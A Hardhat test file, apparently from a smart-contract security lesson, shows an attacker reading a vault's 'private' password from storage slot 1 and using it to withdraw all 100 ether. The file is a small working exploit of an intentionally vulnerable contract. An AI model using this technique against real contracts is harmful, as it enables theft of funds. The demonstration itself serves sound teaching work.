const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault", function () {
	let deployer, attacker;

	beforeEach(async function () {
		[deployer, attacker] = await ethers.getSigners();

		const Vault = await ethers.getContractFactory("Vault", deployer);
		this.vault = await Vault.deploy(
			ethers.utils.formatBytes32String("myPassword")
		);

		await this.vault.deposite({ value: ethers.utils.parseEther("100") });
	});

	it("should be able to access its private variable", async function () {
		let initialBalanceContract = await ethers.provider.getBalance(
			this.vault.address
		);
		let initialBalanceAttacker = await ethers.provider.getBalance(
			attacker.address
		);

		let pwd = await ethers.provider.getStorageAt(this.vault.address, 1);
		await this.vault.connect(attacker).withdraw(pwd);

		let finalBalanceContract = await ethers.provider.getBalance(
			this.vault.address
		);
		let finalBalanceAttacker = await ethers.provider.getBalance(
			attacker.address
		);

		expect(finalBalanceContract).to.eq(0);
		expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
	});
});
